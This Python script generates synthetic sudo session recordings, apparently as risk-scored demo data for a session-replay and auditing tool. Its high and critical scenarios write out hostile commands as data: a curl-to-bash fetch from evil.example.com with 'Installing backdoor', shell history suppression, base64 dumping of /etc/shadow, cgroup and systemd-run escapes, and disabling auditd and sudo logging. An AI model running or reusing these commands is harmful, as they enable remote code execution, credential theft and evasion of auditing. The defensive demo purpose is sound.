#!/usr/bin/env python3
"""Generates realistic synthetic sudo sessions for the demo replay server."""

import json
import os
import random
import time
import uuid
from datetime import datetime, timezone, timedelta

LOG_DIR = "/var/log/sudoreplay-demo"

USERS = ["alice", "bob", "charlie", "ops-bot", "ci-runner"]
HOSTS = ["web01", "web02", "db01", "db02", "build01"]

# (command, cwd, runas, realistic_output_lines)
# Each scenario: (resolved_cmd, cwd, runas, command, _, output_lines)
# risk_level hint: "normal" | "low" | "medium" | "high" | "critical"
# incomplete: True adds an INCOMPLETE marker (session disconnected)

SCENARIOS = [
    # ── Normal / low-risk ────────────────────────────────────────────────────
    {
        "resolved": "/usr/bin/journalctl",
        "cwd": "/home/alice", "runas": "root",
        "command": "journalctl -n 50 -u nginx",
        "risk": "normal",
        "lines": [
            ("-- Logs begin at Mon 2024-01-15 10:00:00 UTC --\r\n", 0.05),
            ("Jan 15 14:22:01 {host} nginx[1234]: 192.168.1.42 - - \"GET /health HTTP/1.1\" 200 3\r\n", 0.1),
            ("Jan 15 14:22:05 {host} nginx[1234]: 10.0.0.5 - - \"POST /api/v1/sessions HTTP/1.1\" 201 847\r\n", 0.08),
            ("Jan 15 14:22:08 {host} nginx[1234]: 10.0.0.5 - - \"GET /api/v1/sessions HTTP/1.1\" 200 12453\r\n", 0.12),
            ("Jan 15 14:23:15 {host} nginx[1234]: 192.168.1.99 - - \"GET /metrics HTTP/1.1\" 200 4521\r\n", 0.09),
        ],
    },
    {
        "resolved": "/usr/bin/systemctl",
        "cwd": "/root", "runas": "root",
        "command": "systemctl restart nginx",
        "risk": "normal",
        "lines": [("\r\n", 0.8)],
    },
    {
        "resolved": "/usr/bin/dnf",
        "cwd": "/root", "runas": "root",
        "command": "dnf update -y --security",
        "risk": "normal",
        "lines": [
            ("Last metadata expiration check: 0:12:34 ago on Mon 15 Jan 2024 14:10:00 UTC.\r\n", 0.3),
            ("Dependencies resolved.\r\n", 0.2),
            ("Upgrading:\r\n", 0.05),
            (" openssl   x86_64   3.0.7-25.el9_3   baseos   1.2 M\r\n", 0.08),
            (" curl      x86_64   7.76.1-26.el9_3  baseos   298 k\r\n", 0.08),
            ("Upgrade  2 Packages\r\n", 0.1),
            ("Downloading Packages:\r\n", 0.5),
            ("(1/2): openssl-3.0.7-25.el9_3.x86_64.rpm     1.1 MB/s | 1.2 MB  00:01\r\n", 1.1),
            ("(2/2): curl-7.76.1-26.el9_3.3.x86_64.rpm     890 kB/s | 298 kB  00:00\r\n", 0.4),
            ("Running transaction\r\n", 0.2),
            ("Complete!\r\n", 0.1),
        ],
    },
    {
        "resolved": "/usr/bin/docker",
        "cwd": "/home/ops-bot", "runas": "root",
        "command": "docker ps -a",
        "risk": "normal",
        "lines": [
            ("CONTAINER ID   IMAGE          COMMAND        CREATED       STATUS        PORTS                   NAMES\r\n", 0.15),
            ("a3f8c1d29e4b   nginx:1.25     \"/docker…\"     2 days ago    Up 2 days     0.0.0.0:80->80/tcp      proxy\r\n", 0.05),
            ("7b2e9f4a1c8d   postgres:15    \"docker…\"      5 days ago    Up 5 days     5432/tcp                db\r\n", 0.05),
            ("2f1a8c5e9b7d   myapp:v2.4.1   \"/app/server\"  12 hours ago  Up 12 hours   0.0.0.0:8080->8080/tcp  api\r\n", 0.05),
        ],
    },
    {
        "resolved": "/usr/bin/ss",
        "cwd": "/root", "runas": "root",
        "command": "ss -tlnp",
        "risk": "normal",
        "lines": [
            ("Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process\r\n", 0.1),
            ("tcp    LISTEN  0       511     0.0.0.0:80          0.0.0.0:*          users:((\"nginx\",pid=1234,fd=6))\r\n", 0.05),
            ("tcp    LISTEN  0       128     0.0.0.0:22          0.0.0.0:*          users:((\"sshd\",pid=891,fd=3))\r\n", 0.05),
        ],
    },
    {
        "resolved": "/usr/bin/tar",
        "cwd": "/var/backups", "runas": "root",
        "command": "tar -czf /var/backups/db-2024-01-15.tar.gz /var/lib/postgresql/data",
        "risk": "normal",
        "lines": [
            ("tar: Removing leading `/' from member names\r\n", 0.2),
            ("/var/lib/postgresql/data/\r\n", 0.3),
            ("/var/lib/postgresql/data/postgresql.conf\r\n", 0.05),
        ],
    },
    {
        "resolved": "/usr/sbin/useradd",
        "cwd": "/root", "runas": "root",
        "command": "useradd -m -s /bin/bash deploy",
        "risk": "low",   # user_created: 15
        "lines": [("\r\n", 0.3)],
    },
    {
        "resolved": "/usr/bin/chmod",
        "cwd": "/etc/nginx", "runas": "root",
        "command": "chmod 777 /tmp/shared-workspace",
        "risk": "low",   # world_writable: 15
        "lines": [("\r\n", 0.1)],
    },
    {
        "resolved": "/usr/bin/grep",
        "cwd": "/var/log", "runas": "root",
        "command": "grep -r 'ERROR' /var/log/app/ | tail -20",
        "risk": "normal",
        "lines": [
            ("/var/log/app/api.log:2024-01-15 14:10:33 ERROR  db connection timeout after 30s\r\n", 0.1),
            ("/var/log/app/api.log:2024-01-15 14:10:36 ERROR  retrying connection (attempt 2/3)\r\n", 0.05),
            ("/var/log/app/worker.log:2024-01-15 13:45:12 ERROR  job queue full, dropping task id=8821\r\n", 0.1),
        ],
    },

    # ── Medium risk ──────────────────────────────────────────────────────────
    {
        "resolved": "/usr/bin/cat",
        "cwd": "/root", "runas": "root",
        "command": "cat /etc/sudoers",
        "risk": "medium",   # sudoers_read: 15
        "lines": [
            ("# /etc/sudoers\r\n", 0.1),
            ("root    ALL=(ALL)       ALL\r\n", 0.05),
            ("%wheel  ALL=(ALL)       ALL\r\n", 0.05),
            ("deploy  ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp\r\n", 0.05),
        ],
    },
    {
        "resolved": "/usr/bin/cat",
        "cwd": "/root/.ssh", "runas": "root",
        "command": "cat /root/.ssh/id_ed25519",
        "risk": "medium",   # ssh_private_key_read: 20
        "lines": [
            ("-----BEGIN OPENSSH PRIVATE KEY-----\r\n", 0.1),
            ("b3BlbnNzaC1rZXktdjEAAAAA...AAAA\r\n", 0.05),
            ("-----END OPENSSH PRIVATE KEY-----\r\n", 0.05),
        ],
    },
    {
        "resolved": "/usr/sbin/usermod",
        "cwd": "/root", "runas": "root",
        "command": "usermod -aG wheel bob",
        "risk": "medium",   # usermod_privileged_group: 25
        "lines": [("\r\n", 0.2)],
    },
    {
        "resolved": "/usr/bin/find",
        "cwd": "/var/log", "runas": "root",
        "command": "find /var/log -name '*.log' -mtime +30 -delete",
        "risk": "normal",
        "lines": [
            ("/var/log/nginx/access.log.2023-12-15\r\n", 0.1),
            ("/var/log/audit/audit.log.2023-12-10\r\n", 0.12),
        ],
    },

    # ── High risk ────────────────────────────────────────────────────────────
    {
        "resolved": "/usr/sbin/visudo",
        "cwd": "/root", "runas": "root",
        "command": "visudo",
        "risk": "high",   # visudo: 60
        "lines": [
            ("\x1b[?2004h\x1b[?1049h\x1b[H\x1b[2J", 0.1),  # terminal init
            ("# /etc/sudoers\r\n", 0.3),
            ("root    ALL=(ALL)       ALL\r\n", 0.1),
            ("%wheel  ALL=(ALL)       ALL\r\n", 0.1),
            ("ci-runner ALL=(ALL) NOPASSWD: ALL\r\n", 0.5),  # suspicious line
            ("\x1b[?1049l\x1b[?2004l", 0.2),
        ],
    },
    {
        "resolved": "/usr/bin/systemctl",
        "cwd": "/root", "runas": "root",
        "command": "systemctl stop auditd",
        "risk": "high",   # stop_auditd: 45 + after_hours: 10 = 55
        "after_hours": True,
        "lines": [
            ("Warning: Stopping auditd.service, but it can still be activated by:\r\n", 0.3),
            ("  auditd.path\r\n", 0.1),
        ],
    },
    {
        "resolved": "/usr/bin/tee",
        "cwd": "/root", "runas": "root",
        "command": "tee /etc/shadow",
        "risk": "high",   # shadow_write: 40 + shadow_read: 15 = 55
        "lines": [
            ("root:$6$rounds=5000$abc123$hash:19000:0:99999:7:::\r\n", 0.2),
            ("deploy:$6$rounds=5000$xyz789$hash:19500:0:99999:7:::\r\n", 0.2),
        ],
    },
    {
        "resolved": "/usr/bin/systemctl",
        "cwd": "/root", "runas": "root",
        "command": "systemctl disable sudo-logger-agent",
        "risk": "high",   # stop_sudo_logger: 50
        "lines": [
            ("Removed /etc/systemd/system/multi-user.target.wants/sudo-logger-agent.service.\r\n", 0.4),
        ],
    },

    # ── Critical risk ────────────────────────────────────────────────────────
    {
        "resolved": "/usr/bin/cgexec",
        "cwd": "/root", "runas": "root",
        "command": "cgexec -g cpu:/ bash",
        "risk": "critical",   # cgroup_escape: 75
        "lines": [
            ("[root@{host} ~]# \r\n", 0.5),
            ("[root@{host} ~]# id\r\n", 1.2),
            ("uid=0(root) gid=0(root) groups=0(root)\r\n", 0.1),
            ("[root@{host} ~]# cat /proc/self/cgroup\r\n", 0.8),
            ("0::/\r\n", 0.1),
            ("[root@{host} ~]# exit\r\n", 3.5),
        ],
    },
    {
        "resolved": "/usr/bin/bash",
        "cwd": "/root", "runas": "root",
        "command": "bash -c 'curl https://evil.example.com/payload.sh | bash'",
        "risk": "critical",   # remote_exec: 40 + root_shell: 10 = 50; with history_suppressed content bumps higher
        "lines": [
            ("  % Total    % Received % Xferd  Average Speed   Time\r\n", 0.3),
            ("100  4821  100  4821    0     0   9842      0 --:--:-- --:--:--\r\n", 0.8),
            ("Installing backdoor...\r\n", 1.2),
            ("HISTFILE=/dev/null\r\n", 0.3),
            ("export HISTFILE\r\n", 0.2),
            ("Done.\r\n", 0.5),
        ],
    },
    {
        "resolved": "/usr/bin/systemd-run",
        "cwd": "/root", "runas": "root",
        "command": "systemd-run --unit=escape --pty bash",
        "risk": "critical",   # systemd_run_delegation: 60 + history_suppressed: 30 = 90
        "lines": [
            ("Running as unit: escape.service\r\n", 0.3),
            ("Press ^] three times within 1s to disconnect TTY.\r\n", 0.2),
            ("[root@{host} ~]# unset HISTFILE\r\n", 1.5),
            ("[root@{host} ~]# cat /etc/shadow | base64\r\n", 0.8),
            ("cm9vdDokNiRy...\r\n", 0.2),
            ("[root@{host} ~]# exit\r\n", 4.0),
        ],
    },

    # ── Disconnected (incomplete) sessions ───────────────────────────────────
    {
        "resolved": "/usr/bin/bash",
        "cwd": "/root", "runas": "root",
        "command": "bash",
        "risk": "high",    # root_shell: 10 + incomplete_session: 15 + after_hours: 10 = 35; combined with content may be higher
        "after_hours": True,
        "incomplete": True,
        "lines": [
            ("[root@{host} ~]# \r\n", 0.5),
            ("[root@{host} ~]# ls -la /etc/sudoers.d/\r\n", 2.1),
            ("total 16\r\n", 0.1),
            ("drwxr-x---. 2 root root  41 Jan 10 09:14 .\r\n", 0.05),
            ("-r--r-----. 1 root root  33 Jan  9 18:02 README\r\n", 0.05),
            ("-r--r-----. 1 root root 173 Jan 10 09:14 90-cloud-init-users\r\n", 0.05),
            ("[root@{host} ~]# \r\n", 0.8),
        ],
    },
    {
        "resolved": "/usr/bin/tee",
        "cwd": "/etc/ssh", "runas": "root",
        "command": "tee -a /etc/ssh/sshd_config",
        "risk": "medium",   # sshd_config: 20 + incomplete_session: 15 = 35
        "incomplete": True,
        "lines": [
            ("PermitRootLogin yes\r\n", 0.4),
            ("PasswordAuthentication yes\r\n", 0.3),
        ],
    },
]


def make_session_id() -> str:
    return uuid.uuid4().hex


def make_cast(host: str, user: str, scenario: dict, start_ts: int) -> tuple[dict, list]:
    header = {
        "version": 2,
        "width": 220,
        "height": 50,
        "timestamp": start_ts,
        "title": f"{user}@{host}: {scenario['command']}",
        "session_id": make_session_id(),
        "user": user,
        "host": host,
        "runas_user": scenario["runas"],
        "runas_uid": 0,
        "runas_gid": 0,
        "cwd": scenario["cwd"],
        "command": scenario["command"],
        "resolved_command": scenario["resolved"],
        "flags": "-H",
        "source": "plugin",
        "has_io": True,
    }

    events = []
    t = 0.0
    for (text, delay) in scenario["lines"]:
        t += delay * (0.7 + random.random() * 0.6)
        events.append([round(t, 6), "o", text.replace("{host}", host)])

    return header, events


def write_session(log_dir: str, user: str, host: str, scenario: dict, when: datetime):
    header, events = make_cast(host, user, scenario, int(when.timestamp()))

    ts_str = when.strftime("%Y%m%d-%H%M%S")
    sid_suffix = header["session_id"][-6:]
    dir_name = f"{host}_{ts_str}-{sid_suffix}"
    sess_dir = os.path.join(log_dir, user, dir_name)
    os.makedirs(sess_dir, mode=0o750, exist_ok=True)

    cast_path = os.path.join(sess_dir, "session.cast")
    with open(cast_path, "w") as f:
        f.write(json.dumps(header) + "\n")
        for ev in events:
            f.write(json.dumps(ev) + "\n")

    json_path = os.path.join(sess_dir, "session.json")
    with open(json_path, "w") as f:
        json.dump(header, f)

    if scenario.get("incomplete"):
        open(os.path.join(sess_dir, "INCOMPLETE"), "w").close()

    print(f"  [{scenario.get('risk','normal'):8s}] {user}@{host}: {header['command']}")


def pick_when(now: datetime, max_age_seconds: int, after_hours: bool) -> datetime:
    age = random.randint(0, max_age_seconds)
    base = now - timedelta(seconds=age)
    if after_hours:
        # Force the hour into the 23:00–04:59 window
        night_hour = random.choice([23, 0, 1, 2, 3, 4])
        base = base.replace(hour=night_hour, minute=random.randint(0, 59), second=random.randint(0, 59))
    return base


def generate_batch(log_dir: str, count: int = 5, max_age_hours: int = 1):
    """Generate `count` random sessions spread over the last `max_age_hours`."""
    now = datetime.now(timezone.utc)
    print(f"Generating {count} sessions...")
    for _ in range(count):
        user = random.choice(USERS)
        host = random.choice(HOSTS)
        scenario = random.choice(SCENARIOS)
        when = pick_when(now, max_age_hours * 3600, scenario.get("after_hours", False))
        write_session(log_dir, user, host, scenario, when)
    print("Done.")


def seed(log_dir: str, count: int = 60):
    """Seed the demo with sessions spread over the last 7 days.

    Guarantees at least one of each risk level and a handful of disconnected sessions.
    """
    now = datetime.now(timezone.utc)
    print(f"Seeding {count} sessions over the last 7 days...")

    # Ensure every risk level and all incomplete scenarios appear at least once
    must_have = [s for s in SCENARIOS if s.get("risk") in ("critical", "high") or s.get("incomplete")]
    for scenario in must_have:
        user = random.choice(USERS)
        host = random.choice(HOSTS)
        when = pick_when(now, 7 * 24 * 3600, scenario.get("after_hours", False))
        write_session(log_dir, user, host, scenario, when)

    remaining = count - len(must_have)
    for _ in range(max(0, remaining)):
        user = random.choice(USERS)
        host = random.choice(HOSTS)
        scenario = random.choice(SCENARIOS)
        when = pick_when(now, 7 * 24 * 3600, scenario.get("after_hours", False))
        write_session(log_dir, user, host, scenario, when)
    print("Seed complete.")


if __name__ == "__main__":
    import sys
    mode = sys.argv[1] if len(sys.argv) > 1 else "batch"
    if mode == "seed":
        seed(LOG_DIR)
    else:
        generate_batch(LOG_DIR, count=int(sys.argv[2]) if len(sys.argv) > 2 else 3)
